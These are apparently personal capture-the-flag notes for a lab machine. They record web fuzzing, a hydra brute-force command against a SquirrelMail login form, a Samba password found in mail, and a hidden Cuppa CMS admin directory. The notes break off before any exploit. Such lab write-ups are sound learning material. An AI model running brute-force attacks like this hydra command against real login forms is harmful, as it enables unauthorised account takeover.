![[Pasted image 20210528145137.png]]

fuzzing
![[Pasted image 20210528155352.png]]

http://10.10.82.251/squirrelmail/ redirects to http://10.10.82.251/squirrelmail/src/login.php

![[Pasted image 20210528151604.png]]


and trying creds 

```
hydra -l milesdyson -P loot/log1.txt 10.10.82.251 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."
```

we get a hit  

![[Pasted image 20210528153957.png]]

after login in 

![[Pasted image 20210528154210.png]]

![[Pasted image 20210528154906.png]]
the passwd for samba is changed to 

```
)s{A&2Z=F^n_E.B`
```


`dir:/45kra24zxs28v3yd`

![[Pasted image 20210528155317.png]]


fuzzing it

we get a hit 
![[Pasted image 20210528160214.png]]


http://10.10.82.251/45kra24zxs28v3yd/administrator/

![[Pasted image 20210528160242.png]]

Cuppa CMS